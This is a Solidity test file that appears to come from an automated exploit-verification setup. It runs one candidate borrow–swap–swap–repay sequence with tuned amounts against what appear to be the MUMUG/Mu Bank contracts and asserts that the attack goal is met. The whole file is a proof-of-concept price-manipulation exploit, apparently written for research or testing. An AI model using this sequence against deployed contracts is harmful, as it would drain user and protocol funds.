// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "./MUMUG.t.sol";

contract MUMUGVerify is MUMUGTest {
    function test_verify_cand002_0() public {
        uint256 amt0 = 0x8fc00030000000000000;
        uint256 amt1 = 0x14c523338e64397ffffd;
        uint256 amt2 = 0x2800000000000;
        uint256 amt3 = 0x8fd019e3f66d33041826;
        borrow_mu(amt0);
        swap_pair_mu_usdce(amt1);
        swap_mubank_usdce_mu(amt2);
        payback_mu(amt3);
        require(attackGoal(), "Attack failed!");
    }
}
